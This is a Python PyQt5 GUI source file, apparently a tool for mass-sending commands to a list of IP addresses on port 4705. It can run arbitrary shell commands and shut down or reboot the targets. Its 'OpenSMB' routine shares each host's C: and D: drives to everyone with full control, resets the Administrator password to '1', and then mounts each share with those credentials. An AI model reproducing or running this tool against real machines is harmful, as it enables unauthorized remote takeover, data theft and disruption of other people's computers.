import os
import PyQt5.QtCore as qc
from PyQt5.QtCore import QTimer
from PyQt5.QtWidgets import QWidget, QListWidgetItem
from qfluentwidgets import CheckBox

from view.ui.send_cmd_ui import Ui_Form_send_cmd
from utils.tool_api import send
from utils.utils import utils


class send_cmd(QWidget, Ui_Form_send_cmd, utils):
    def __init__(self):
        super().__init__()
        self.setupUi(self)
        self.infoBar = super().infoBar

        self.LineEdit_cmd.setPlaceholderText("输入要发送的命令")
        self.LineEdit_port.setPlaceholderText("端口默认4705")
        self.settings = qc.QSettings("./config/config.ini", qc.QSettings.IniFormat)

        self.Button_Send.clicked.connect(lambda: self.utils("cmd", False, False))
        self.Button_Shutdown.clicked.connect(lambda: self.utils("shutdown", False, True))
        self.Button_Reboot.clicked.connect(lambda: self.utils("reboot", False, True))
        self.Button_OpenSMB.clicked.connect(lambda: self.utils("cmd", True, True))

        self.PillPushButton_selectAll.clicked.connect(self.selectAll)
        self.PrimaryPushButton_load_ip.clicked.connect(self.load_ip)

        self.load_ip()

    def pause(self, seconds) -> None:
        loop = qc.QEventLoop()
        qc.QTimer.singleShot(seconds * 1000, loop.quit)
        loop.exec_()

    def lock(self) -> None:  # 命令发送时锁住按钮
        self.Button_Send.setEnabled(False)
        self.Button_Reboot.setEnabled(False)
        self.Button_Shutdown.setEnabled(False)
        self.Button_OpenSMB.setEnabled(False)
        self.ProgressBar.setValue(0)
        for i in range(int(self.settings.value("CONFIG/time"))):
            self.pause(1)
            self.ProgressBar.setValue(i + 1)
        self.ProgressRing.setValue(0)
        self.Button_Send.setEnabled(True)
        self.Button_Reboot.setEnabled(True)
        self.Button_Shutdown.setEnabled(True)
        self.Button_OpenSMB.setEnabled(True)

    def detect(self, button: bool) -> bool:  # 检测参数
        if self.LineEdit_port.text() == '':
            self.LineEdit_port.setText("4705")
            self.infoBar("warning", "端口为空，已填写默认端口4705")
            return False

        if not button:
            if self.LineEdit_cmd.text() == '':
                self.infoBar("error", "发送命令为空。")
                return False

        return True

    def get_list(self) -> list:  # 获取选中ip
        count = self.ListWidget.count()
        check_box_list = [self.ListWidget.itemWidget(self.ListWidget.item(i)) for i in range(count)]
        chooses = []
        for cb in check_box_list:
            if cb.isChecked():
                chooses.append(cb.text())
        if not chooses:
            self.infoBar("error", "无IP选择。")
        return chooses

    def run(self, chooses: list, msg_type: str, smb: bool) -> None:  # 运行
        if msg_type == "reboot":
            pass
        elif msg_type == "shutdown":
            pass
        else:
            if self.settings.value("CONFIG/run_type") == "cmd.exe":
                msg_type = "cmd"
            elif self.settings.value("CONFIG/run_type") == "powershell.exe":
                msg_type = "powershell"
        self.ProgressRing.setMaximum(len(chooses))
        self.ProgressBar.setMaximum(int(self.settings.value("CONFIG/time")))
        for i, choose in enumerate(chooses):
            if choose == "":
                self.infoBar("error", "ip不合法。")
                continue
            if smb:
                if self.settings.value("CONFIG/run_type") == "powershell.exe":
                    send(msg_type,
                         "& net share c=c: '/grant:everyone,FULL' ; net share d=d: '/grant:everyone,FULL'; net user Administrator '1'",
                         choose, int(self.LineEdit_port.text()))


                if self.settings.value("CONFIG/run_type") == "cmd.exe":
                    send(msg_type,
                         'net share c=c: /grant:everyone,FULL & net share d=d: /grant:everyone,FULL & net user Administrator "1"',
                         choose, int(self.LineEdit_port.text()))

            else:
                send(msg_type, '"' + self.LineEdit_cmd.text() + '"', choose, int(self.LineEdit_port.text()))
            self.pause(0.125)
            self.ProgressRing.setValue(i + 1)
        if smb:
            QTimer.singleShot(int(self.settings.value("CONFIG/time")) * 3000, self.use_dir)
        self.infoBar("success", "发送成功")
        self.lock()

    def use_dir(self) -> None:  # 自动输入密码，连接
        ip_list = self.get_list()
        for ip in ip_list:
            os.system(f'cmd /c "net use \\\\{ip} /user:Administrator 1"')

    def utils(self, cmd: str, smb: bool, button: bool):
        if not self.detect(button):
            pass
        else:
            chooses = self.get_list()
            if not chooses:
                pass
            else:
                self.run(chooses, cmd, smb)

    def selectAll(self) -> None:  # 全选按钮
        check_box_list = [self.ListWidget.itemWidget(self.ListWidget.item(i)) for i in range(self.ListWidget.count())]
        if self.PillPushButton_selectAll.isChecked():
            for check in check_box_list:
                check.setChecked(True)
        else:
            for check in check_box_list:
                check.setChecked(False)

    def load_ip(self):
        self.ListWidget.clear()
        if self.settings.value("CONFIG/ip_list") == "":
            self.infoBar("warning", "未找到ip列表，请去设置。")
        else:
            try:
                with open(self.settings.value("CONFIG/ip_list"), "r", encoding="utf-8") as file:
                    for data in file.read().split("\n"):
                        box = CheckBox(data)
                        item = QListWidgetItem()
                        self.ListWidget.addItem(item)
                        self.ListWidget.setItemWidget(item, box)

            except TypeError as error:
                self.infoBar("warning", "未找到ip列表，请去设置。")

            except FileNotFoundError as error:
                self.infoBar("error", "列表文件没有找到。")
